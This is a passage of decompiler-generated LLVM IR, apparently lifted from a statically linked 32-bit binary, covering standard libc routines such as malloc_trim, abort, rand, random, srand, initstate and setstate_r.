  %v0_8050fa9 = load i32, i32* @ecx, align 4
  store i32 %v0_8050fa9, i32* @global_var_805e80c.179, align 4
  br label %dec_label_pc_8050faf

dec_label_pc_8050faf:                             ; preds = %dec_label_pc_8050f7a, %dec_label_pc_8050f9f
  %v0_8050faf = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_8050faf, 131072
  br i1 %tmp, label %dec_label_pc_8051014, label %dec_label_pc_8050fb7

dec_label_pc_8050fb7:                             ; preds = %dec_label_pc_8050faf
  %v0_8050fb7 = load i8, i8* @global_var_805e7e0.178, align 32
  %v1_8050fb7 = and i8 %v0_8050fb7, 2
  %v2_8050fb7 = icmp eq i8 %v1_8050fb7, 0
  br i1 %v2_8050fb7, label %dec_label_pc_8050fd0, label %dec_label_pc_8050fc0

dec_label_pc_8050fc0:                             ; preds = %dec_label_pc_8050fb7
  %v2_8050fc8 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805e7e0.178 to i32*))
  store i32 %v2_8050fc8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050fd0

dec_label_pc_8050fd0:                             ; preds = %dec_label_pc_8050fb7, %dec_label_pc_8050fc0
  %v0_8050fd0 = load i32, i32* @global_var_805e80c.179, align 4
  store i32 %v0_8050fd0, i32* %eax.global-to-local, align 4
  %v1_8050fd5 = add i32 %v0_8050fd0, 4
  %v2_8050fd5 = inttoptr i32 %v1_8050fd5 to i32*
  %v3_8050fd5 = load i32, i32* %v2_8050fd5, align 4
  %v1_8050fd8 = and i32 %v3_8050fd5, -4
  store i32 %v1_8050fd8, i32* %eax.global-to-local, align 4
  %v1_8050fdb = load i32, i32* @global_var_805eb24.195, align 4
  %v7_8050fdb = icmp ult i32 %v1_8050fd8, %v1_8050fdb
  br i1 %v7_8050fdb, label %dec_label_pc_8051014, label %dec_label_pc_8050fe3

dec_label_pc_8050fe3:                             ; preds = %dec_label_pc_8050fd0
  %v0_8050fe3 = load i32, i32* @global_var_805eb28.193, align 8
  store i32 %v0_8050fe3, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_805e7e0.178 to i32), i32* @edx, align 4
  %v0_8050fed = call i32 @__malloc_trim()
  store i32 %v0_8050fed, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051014

dec_label_pc_8050ff4:                             ; preds = %dec_label_pc_8050efc
  %v2_8050ff4 = inttoptr i32 %v1_8050ec5 to i32*
  %v3_8050ff4 = load i32, i32* %v2_8050ff4, align 4
  %v0_8050ff7 = load i32, i32* @global_var_805eb30.186, align 16
  %v1_8050ff7 = add i32 %v0_8050ff7, -1
  store i32 %v1_8050ff7, i32* @global_var_805eb30.186, align 16
  %v2_8050ffd = add i32 %v3_8050ff4, %v1_8050ed5
  store i32 %v2_8050ffd, i32* %eax.global-to-local, align 4
  %v2_8051000 = sub i32 %v1_8050ec5, %v3_8050ff4
  %v0_8051006 = load i32, i32* @global_var_805eb44.190, align 4
  %v2_8051006 = sub i32 %v0_8051006, %v2_8050ffd
  store i32 %v2_8051006, i32* @global_var_805eb44.190, align 4
  %v4_805100c = call i32 @munmap(i32 %v2_8051000, i32 %v2_8050ffd, i32 %v1_8050ed5, i32 %v1_8050ed5)
  store i32 %v4_805100c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051014

dec_label_pc_8051014:                             ; preds = %dec_label_pc_8050fd0, %dec_label_pc_8050faf, %dec_label_pc_8050fe3, %dec_label_pc_8050edc, %dec_label_pc_8050ff4
  store i32 %v2_8050eaf, i32* @eax, align 4
  %v2_805101d = call i32 @__pthread_return_void(i32 %v2_8050eaf, i32 1)
  store i32 %v2_805101d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051025

dec_label_pc_8051025:                             ; preds = %entry, %dec_label_pc_8051014
  %.0 = phi i32 [ undef, %entry ], [ %v2_805101d, %dec_label_pc_8051014 ]
  store i32 %v0_8050e94, i32* @ebx, align 4
  store i32 %v0_8050e93, i32* @esi, align 4
  store i32 %v0_8050e92, i32* @edi, align 4
  store i32 %v0_8050e91, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8050ff4, { 1, 0 }
  uselistorder i32 %v0_8050f86, { 1, 0 }
  uselistorder i32 %v1_8050f54, { 1, 0 }
  uselistorder i32 %v2_8050f4d, { 1, 0 }
  uselistorder i32 %v1_8050f42, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050f51, { 1, 0 }
  uselistorder i32 %v1_8050ed5, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8050ecd, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8050ec5, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_805e7e0.178 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_805e814.181 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_805e80c.179, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_8058370.177 to i32), { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_8051025, { 1, 0 }
  uselistorder label %dec_label_pc_8051014, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8050fd0, { 1, 0 }
  uselistorder label %dec_label_pc_8050faf, { 1, 0 }
  uselistorder label %dec_label_pc_8050f7a, { 1, 0 }
  uselistorder label %dec_label_pc_8050f72, { 1, 0 }
  uselistorder label %dec_label_pc_8050f3e, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805102d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805103a = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_805e7e0.178 to i8) to i32) to i32*))
  store i32 ptrtoint (i8* @global_var_805e7e0.178 to i32), i32* @edx, align 4
  %v0_8051047 = load i32, i32* @ebx, align 4
  store i32 %v0_8051047, i32* @eax, align 4
  store i32 %v0_805102d, i32* @ebx, align 4
  %v0_805104a = call i32 @__malloc_trim()
  ret i32 %v0_805104a

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_805e7e0.178 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_805e7e0.178, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_805105c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058388.198 to i32))
  %v12_8051066 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805106b

dec_label_pc_805106b:                             ; preds = %dec_label_pc_805106b.dec_label_pc_805106b_crit_edge, %entry
  %v0_805106b = phi i32 [ %v12_8051066, %entry ], [ %v0_805106b.pre, %dec_label_pc_805106b.dec_label_pc_805106b_crit_edge ]
  %v1_805107619 = phi i32 [ 31, %entry ], [ %v1_8051076, %dec_label_pc_805106b.dec_label_pc_805106b_crit_edge ]
  %v2_805106b = mul i32 %v1_805107619, 4
  %v3_805106b = add i32 %v2_805106b, 152
  %v4_805106b = add i32 %v3_805106b, %v0_805106b
  %v5_805106b = inttoptr i32 %v4_805106b to i32*
  store i32 0, i32* %v5_805106b, align 4
  %v0_8051076.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8051076 = add i32 %v0_8051076.pre, -1
  %v9_8051076 = icmp slt i32 %v1_8051076, 0
  store i32 %v1_8051076, i32* %eax.global-to-local, align 4
  %v1_8051077 = icmp eq i1 %v9_8051076, false
  br i1 %v1_8051077, label %dec_label_pc_805106b.dec_label_pc_805106b_crit_edge, label %dec_label_pc_8051079

dec_label_pc_805106b.dec_label_pc_805106b_crit_edge: ; preds = %dec_label_pc_805106b
  %v0_805106b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805106b

dec_label_pc_8051079:                             ; preds = %dec_label_pc_805106b
  %v0_8051079 = load i32, i32* @ebx, align 4
  %v2_805107d = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_805107d, i32* @ebx, align 4
  %v4_8051085 = call i32 @__sigaddset(i32 %v2_805107d, i32 6, i32 %v0_8051079, i32 %v0_8051079)
  store i32 %v4_8051085, i32* %eax.global-to-local, align 4
  %v1_805108d = icmp eq i32 %v4_8051085, 0
  %v1_805108f = icmp eq i1 %v1_805108d, false
  br i1 %v1_805108f, label %dec_label_pc_805109f, label %dec_label_pc_8051091

dec_label_pc_8051091:                             ; preds = %dec_label_pc_8051079
  %v3_8051097 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8051097 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_8051097, i32 0)
  store i32 %v4_8051097, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805109f

dec_label_pc_805109f:                             ; preds = %dec_label_pc_8051079, %dec_label_pc_8051091
  %v2_80510d74 = phi i32 [ %v4_8051085, %dec_label_pc_8051079 ], [ %v4_8051097, %dec_label_pc_8051091 ]
  %v0_805109f = load i8, i8* @global_var_805e700.199, align 256
  %v1_805109f = icmp eq i8 %v0_805109f, 0
  %v1_80510a6 = icmp eq i1 %v1_805109f, false
  br i1 %v1_80510a6, label %dec_label_pc_80510d7, label %dec_label_pc_80510a8

dec_label_pc_80510a8:                             ; preds = %dec_label_pc_805109f
  store i8 1, i8* @global_var_805e700.199, align 256
  br label %dec_label_pc_80510af

dec_label_pc_80510af:                             ; preds = %dec_label_pc_8051116, %dec_label_pc_80510a8
  %v1_80510b7 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058388.198 to i32))
  store i32 %v1_80510b7, i32* %eax.global-to-local, align 4
  %v1_80510c3 = call i32 @__raise(i32 6)
  store i32 %v1_80510c3, i32* %eax.global-to-local, align 4
  %v1_80510cf = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058388.198 to i32))
  store i32 %v1_80510cf, i32* %eax.global-to-local, align 4
  %v0_80510d7.pre = load i8, i8* @global_var_805e700.199, align 256
  br label %dec_label_pc_80510d7

dec_label_pc_80510d7:                             ; preds = %dec_label_pc_805109f, %dec_label_pc_80510af
  %v2_80510d7 = phi i32 [ %v2_80510d74, %dec_label_pc_805109f ], [ %v1_80510cf, %dec_label_pc_80510af ]
  %v0_80510d7 = phi i8 [ %v0_805109f, %dec_label_pc_805109f ], [ %v0_80510d7.pre, %dec_label_pc_80510af ]
  %v1_80510d7 = zext i8 %v0_80510d7 to i32
  %v3_80510d7 = and i32 %v2_80510d7, -256
  %v4_80510d7 = or i32 %v1_80510d7, %v3_80510d7
  store i32 %v4_80510d7, i32* %eax.global-to-local, align 4
  %v10_80510dc = icmp eq i8 %v0_80510d7, 1
  %v1_80510de = icmp eq i1 %v10_80510dc, false
  br i1 %v1_80510de, label %dec_label_pc_8051138, label %dec_label_pc_80510e0

dec_label_pc_80510e0:                             ; preds = %dec_label_pc_80510d7
  %v2_80510e8 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_80510e8, i32* %eax.global-to-local, align 4
  store i8 2, i8* @global_var_805e700.199, align 256
  %v3_80510f4 = bitcast i32* %stack_var_-272 to i8*
  %v4_80510f4 = call i32 @__GI_memset(i8* %v3_80510f4, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805110b

dec_label_pc_805110b:                             ; preds = %dec_label_pc_805110b.dec_label_pc_805110b_crit_edge, %dec_label_pc_80510e0
  %v0_805110b = phi i32 [ %v12_8051066, %dec_label_pc_80510e0 ], [ %v0_805110b.pre, %dec_label_pc_805110b.dec_label_pc_805110b_crit_edge ]
  %v1_805111318 = phi i32 [ 31, %dec_label_pc_80510e0 ], [ %v1_8051113, %dec_label_pc_805110b.dec_label_pc_805110b_crit_edge ]
  %v2_805110b = mul i32 %v1_805111318, 4
  %v3_805110b = add i32 %v2_805110b, 16
  %v4_805110b = add i32 %v3_805110b, %v0_805110b
  %v5_805110b = inttoptr i32 %v4_805110b to i32*
  store i32 -1, i32* %v5_805110b, align 4
  %v0_8051113.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8051113 = add i32 %v0_8051113.pre, -1
  %v9_8051113 = icmp slt i32 %v1_8051113, 0
  store i32 %v1_8051113, i32* %eax.global-to-local, align 4
  %v1_8051114 = icmp eq i1 %v9_8051113, false
  br i1 %v1_8051114, label %dec_label_pc_805110b.dec_label_pc_805110b_crit_edge, label %dec_label_pc_8051116

dec_label_pc_805110b.dec_label_pc_805110b_crit_edge: ; preds = %dec_label_pc_805110b
  %v0_805110b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805110b

dec_label_pc_8051116:                             ; preds = %dec_label_pc_805110b
  store i32 %v2_80510e8, i32* %eax.global-to-local, align 4
  %v4_805112b = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_805112b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80510af

dec_label_pc_8051138:                             ; preds = %dec_label_pc_80510d7
  %v10_8051138 = icmp eq i8 %v0_80510d7, 2
  %v1_805113a = icmp eq i1 %v10_8051138, false
  br i1 %v1_805113a, label %dec_label_pc_8051144, label %dec_label_pc_805113c

dec_label_pc_805113c:                             ; preds = %dec_label_pc_8051138
  store i8 3, i8* @global_var_805e700.199, align 256
  br label %dec_label_pc_8051144

dec_label_pc_8051144:                             ; preds = %dec_label_pc_8051138, %dec_label_pc_805113c
  %v0_8051144 = phi i8 [ %v0_80510d7, %dec_label_pc_8051138 ], [ 3, %dec_label_pc_805113c ]
  %v9_8051144 = icmp eq i8 %v0_8051144, 3
  %v1_805114b = icmp eq i1 %v9_8051144, false
  br i1 %v1_805114b, label %dec_label_pc_805115e, label %dec_label_pc_805114d

dec_label_pc_805114d:                             ; preds = %dec_label_pc_8051144
  store i8 4, i8* @global_var_805e700.199, align 256
  %v1_8051159 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_805115e:                             ; preds = %dec_label_pc_8051144, %dec_label_pc_805115e
  br label %dec_label_pc_805115e

; uselistorder directives
  uselistorder i32 %v1_8051113, { 2, 1, 0 }
  uselistorder i8 %v0_80510d7, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8051076, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1 }
  uselistorder i8 3, { 0, 3, 5, 4, 1, 2 }
  uselistorder i8* @global_var_805e700.199, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805115e, { 1, 0 }
  uselistorder label %dec_label_pc_8051144, { 1, 0 }
  uselistorder label %dec_label_pc_80510d7, { 1, 0 }
  uselistorder label %dec_label_pc_805109f, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_8051164 = call i32 @random()
  ret i32 %v0_8051164

; uselistorder directives
  uselistorder i32 ()* @random, { 11, 0, 5, 4, 3, 2, 1, 10, 9, 8, 7, 6 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805116c = load i32, i32* @ebx, align 4
  store i32 %v0_805116c, i32* %stack_var_-4, align 4
  %v2_805117a = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805117a, i32* @ebx, align 4
  %v2_805117f = call i32 @__pthread_return_void(i32 %v2_805117a, i32 134552147)
  %v1_805118b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80583a0.200 to i32))
  %v2_8051192 = ptrtoint i32* %stack_var_-8 to i32
  %v3_805119c = call i32 @__GI_random_r(i32* nonnull @global_var_80583b8, i32 %v2_8051192)
  store i32 ptrtoint (i32* @global_var_80583b8 to i32), i32* @eax, align 4
  %v2_80511a6 = call i32 @__pthread_return_void(i32 %v2_805117a, i32 1)
  %v3_80511ab = load i32, i32* %stack_var_-8, align 4
  %v2_80511b2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80511b2, i32* @ebx, align 4
  ret i32 %v3_80511ab
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_80511c5 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80511c5, i32* @eax, align 4
  %v2_80511ca = call i32 @__pthread_return_void(i32 %v2_80511c5, i32 134552147)
  %v1_80511d6 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80583a0.200 to i32))
  %v0_80511db = load i32, i32* bitcast (i32** @global_var_80583c0.203 to i32*), align 64
  store i32 %v0_80511db, i32* @ebx, align 4
  %v3_80511ec = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_80583b8)
  %v2_80511f4 = icmp slt i32 %v3_80511ec, 0
  br i1 %v2_80511f4, label %dec_label_pc_80511fb, label %dec_label_pc_80511f8

dec_label_pc_80511f8:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_80583bc.204 to i32), i32* @esi, align 4
  br label %dec_label_pc_80511fb

dec_label_pc_80511fb:                             ; preds = %entry, %dec_label_pc_80511f8
  store i32 %v2_80511c5, i32* @eax, align 4
  %v2_8051204 = call i32 @__pthread_return_void(i32 %v2_80511c5, i32 1)
  %v0_805120c = load i32, i32* @esi, align 4
  ret i32 %v0_805120c

; uselistorder directives
  uselistorder label %dec_label_pc_80511fb, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_8051220 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051220, i32* @ebx, align 4
  %v2_8051225 = call i32 @__pthread_return_void(i32 %v2_8051220, i32 134552147)
  %v1_8051231 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80583a0.200 to i32))
  store i32 ptrtoint (i32** @global_var_80583bc.204 to i32), i32* @esi, align 4
  %v4_8051250 = inttoptr i32 %arg2 to i32*
  %v5_8051250 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_8051250, i32 %arg3, i32 ptrtoint (i32* @global_var_80583b8 to i32))
  store i32 %v5_8051250, i32* @eax, align 4
  %v2_805125b = call i32 @__pthread_return_void(i32 %v2_8051220, i32 1)
  %v0_8051263 = load i32, i32* @esi, align 4
  ret i32 %v0_8051263
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051268 = load i32, i32* @ebx, align 4
  store i32 %v0_8051268, i32* %stack_var_-4, align 4
  %v2_8051276 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8051276, i32* @ebx, align 4
  %v2_805127b = call i32 @__pthread_return_void(i32 %v2_8051276, i32 134552147)
  %v1_8051287 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80583a0.200 to i32))
  %v3_8051297 = call i32 @srandom_r(i32 %arg1, i32* nonnull @global_var_80583b8)
  store i32 ptrtoint (i32* @global_var_80583b8 to i32), i32* @eax, align 4
  %v2_80512a1 = call i32 @__pthread_return_void(i32 %v2_8051276, i32 1)
  %v2_80512a9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80512a9, i32* @ebx, align 4
  ret i32 %v2_80512a1

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_80583b8 to i32), { 1, 2, 0 }
  uselistorder i32* @global_var_80583b8, { 0, 1, 3, 2 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v0_80512af = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v1_80512bb = add i32 %tmp3, 12
  %v2_80512bb = inttoptr i32 %v1_80512bb to i32*
  %v3_80512bb = load i32, i32* %v2_80512bb, align 4
  store i32 %v3_80512bb, i32* %ecx.global-to-local, align 4
  %v1_80512be = add i32 %arg1, 4
  store i32 %v1_80512be, i32* %esi.global-to-local, align 4
  %v1_80512c1 = add i32 %tmp3, 8
  %v2_80512c1 = inttoptr i32 %v1_80512c1 to i32*
  %v3_80512c1 = load i32, i32* %v2_80512c1, align 4
  %v1_80512c4 = icmp eq i32 %v3_80512bb, 0
  %v1_80512c6 = icmp eq i1 %v1_80512c4, false
  br i1 %v1_80512c6, label %dec_label_pc_80512d1, label %dec_label_pc_80512c8

dec_label_pc_80512c8:                             ; preds = %entry
  %v1_80512c8 = add i32 %v3_80512c1, -4
  %v2_80512c8 = inttoptr i32 %v1_80512c8 to i32*
  store i32 0, i32* %v2_80512c8, align 4
  br label %dec_label_pc_80512e1

dec_label_pc_80512d1:                             ; preds = %entry
  %v1_80512d1 = add i32 %tmp3, 4
  %v2_80512d1 = inttoptr i32 %v1_80512d1 to i32*
  %v3_80512d1 = load i32, i32* %v2_80512d1, align 4
  %v2_80512d4 = sub i32 %v3_80512d1, %v3_80512c1
  %v2_80512d6 = sdiv i32 %v2_80512d4, 4
  %v3_80512d9 = mul i32 %v2_80512d6, 5
  %v2_80512dc = add i32 %v3_80512d9, %v3_80512bb
  store i32 %v2_80512dc, i32* %eax.global-to-local, align 4
  %v2_80512de = add i32 %v3_80512c1, -4
  %v3_80512de = inttoptr i32 %v2_80512de to i32*
  store i32 %v2_80512dc, i32* %v3_80512de, align 4
  br label %dec_label_pc_80512e1

dec_label_pc_80512e1:                             ; preds = %dec_label_pc_80512c8, %dec_label_pc_80512d1
  %v0_80512e1 = load i32, i32* %esi.global-to-local, align 4
  %v1_80512e1 = add i32 %v0_80512e1, -4
  %v2_80512e1 = inttoptr i32 %v1_80512e1 to i32*
  %v3_80512e1 = load i32, i32* %v2_80512e1, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_80512e9 = ashr i32 %v3_80512e1, 31
  %v2_80512ea = zext i32 %v3_80512e1 to i64
  %v4_80512ea = zext i32 %v1_80512e9 to i64
  %v5_80512ea = mul nuw i64 %v4_80512ea, 4294967296
  %v6_80512ea = or i64 %v5_80512ea, %v2_80512ea
  %v8_80512ea = sdiv i64 %v6_80512ea, 5
  %v9_80512ea = trunc i64 %v8_80512ea to i32
  store i32 %v9_80512ea, i32* %eax.global-to-local, align 4
  %v10_80512ea = srem i64 %v6_80512ea, 5
  %v11_80512ea = trunc i64 %v10_80512ea to i32
  %v6_80512ef = icmp ugt i32 %v11_80512ea, 4
  br i1 %v6_80512ef, label %dec_label_pc_805132f, label %dec_label_pc_80512f1

dec_label_pc_80512f1:                             ; preds = %dec_label_pc_80512e1
  %v1_80512f1 = mul i32 %v11_80512ea, 4
  %v2_80512f1 = add i32 %v1_80512f1, ptrtoint (i32* @global_var_80573b4.205 to i32)
  %v3_80512f1 = inttoptr i32 %v2_80512f1 to i32*
  %v4_80512f1 = load i32, i32* %v3_80512f1, align 4
  store i32 %v4_80512f1, i32* %ecx.global-to-local, align 4
  %v1_80512f8 = icmp eq i32 %v11_80512ea, 0
  %v2_80512fa = add i32 %v1_80512f1, ptrtoint (i32* @global_var_80573a0.206 to i32)
  %v3_80512fa = inttoptr i32 %v2_80512fa to i32*
  %v4_80512fa = load i32, i32* %v3_80512fa, align 4
  store i32 %v4_80512fa, i32* %ebp.global-to-local, align 4
  %v1_8051301 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051301 = add i32 %v1_8051301, 12
  %v3_8051301 = inttoptr i32 %v2_8051301 to i32*
  store i32 %v11_80512ea, i32* %v3_8051301, align 4
  %v0_8051304 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051304 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051304 = add i32 %v1_8051304, 16
  %v3_8051304 = inttoptr i32 %v2_8051304 to i32*
  store i32 %v0_8051304, i32* %v3_8051304, align 4
  %v0_8051307 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051307 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051307 = add i32 %v1_8051307, 20
  %v3_8051307 = inttoptr i32 %v2_8051307 to i32*
  store i32 %v0_8051307, i32* %v3_8051307, align 4
  br i1 %v1_80512f8, label %dec_label_pc_8051322, label %dec_label_pc_805130c

dec_label_pc_805130c:                             ; preds = %dec_label_pc_80512f1
  %v0_805130c = load i32, i32* %esi.global-to-local, align 4
  %v1_805130c = add i32 %v0_805130c, -4
  %v2_805130c = inttoptr i32 %v1_805130c to i32*
  %v3_805130c = load i32, i32* %v2_805130c, align 4
  %v1_805130f = ashr i32 %v3_805130c, 31
  %v0_8051310 = load i32, i32* %edi.global-to-local, align 4
  %v2_8051310 = zext i32 %v3_805130c to i64
  %v4_8051310 = zext i32 %v1_805130f to i64
  %v5_8051310 = mul nuw i64 %v4_8051310, 4294967296
  %v6_8051310 = or i64 %v5_8051310, %v2_8051310
  %v7_8051310 = zext i32 %v0_8051310 to i64
  %v8_8051310 = sdiv i64 %v6_8051310, %v7_8051310
  %v9_8051310 = trunc i64 %v8_8051310 to i32
  %v2_8051312 = mul i32 %v9_8051310, 4
  %v3_8051312 = add i32 %v2_8051312, %v0_805130c
  %v1_8051315 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051315 = add i32 %v1_8051315, %v9_8051310
  store i32 %v2_8051315, i32* %eax.global-to-local, align 4
  %v1_8051317 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051317 = add i32 %v1_8051317, 4
  %v3_8051317 = inttoptr i32 %v2_8051317 to i32*
  store i32 %v3_8051312, i32* %v3_8051317, align 4
  %v0_805131a = load i32, i32* %eax.global-to-local, align 4
  %v1_805131a = ashr i32 %v0_805131a, 31
  %v0_805131b = load i32, i32* %ecx.global-to-local, align 4
  %v2_805131b = zext i32 %v0_805131a to i64
  %v4_805131b = zext i32 %v1_805131a to i64
  %v5_805131b = mul nuw i64 %v4_805131b, 4294967296
  %v6_805131b = or i64 %v5_805131b, %v2_805131b
  %v7_805131b = zext i32 %v0_805131b to i64
  %v8_805131b = sdiv i64 %v6_805131b, %v7_805131b
  %v9_805131b = trunc i64 %v8_805131b to i32
  store i32 %v9_805131b, i32* %eax.global-to-local, align 4
  %v10_805131b = srem i64 %v6_805131b, %v7_805131b
  %v11_805131b = trunc i64 %v10_805131b to i32
  %v0_805131d = load i32, i32* %esi.global-to-local, align 4
  %v2_805131d = mul i32 %v11_805131b, 4
  %v3_805131d = add i32 %v2_805131d, %v0_805131d
  %v1_8051320 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051320 = inttoptr i32 %v1_8051320 to i32*
  store i32 %v3_805131d, i32* %v2_8051320, align 4
  br label %dec_label_pc_8051322

dec_label_pc_8051322:                             ; preds = %dec_label_pc_80512f1, %dec_label_pc_805130c
  %v0_8051322 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051322 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051322 = mul i32 %v1_8051322, 4
  %v3_8051322 = add i32 %v2_8051322, %v0_8051322
  %v1_8051325 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051325 = add i32 %v1_8051325, 24
  %v3_8051325 = inttoptr i32 %v2_8051325 to i32*
  store i32 %v3_8051322, i32* %v3_8051325, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805132a = load i32, i32* %esi.global-to-local, align 4
  %v1_805132a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805132a = add i32 %v1_805132a, 8
  %v3_805132a = inttoptr i32 %v2_805132a to i32*
  store i32 %v0_805132a, i32* %v3_805132a, align 4
  %v0_8051344.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805133d

dec_label_pc_805132f:                             ; preds = %dec_label_pc_80512e1
  %v1_805132f = call i32 @__errno_location(i32 %v0_80512af)
  %v1_8051334 = inttoptr i32 %v1_805132f to i32*
  store i32 22, i32* %v1_8051334, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805133d

dec_label_pc_805133d:                             ; preds = %dec_label_pc_8051322, %dec_label_pc_805132f
  %v0_8051344 = phi i32 [ %v0_8051344.pre, %dec_label_pc_8051322 ], [ -1, %dec_label_pc_805132f ]
  store i32 %v0_80512af, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051344

; uselistorder directives
  uselistorder i32 %v11_80512ea, { 1, 3, 2, 0 }
  uselistorder i32 %tmp3, { 0, 1, 3, 2 }
  uselistorder i64 5, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805133d, { 1, 0 }
  uselistorder label %dec_label_pc_8051322, { 1, 0 }
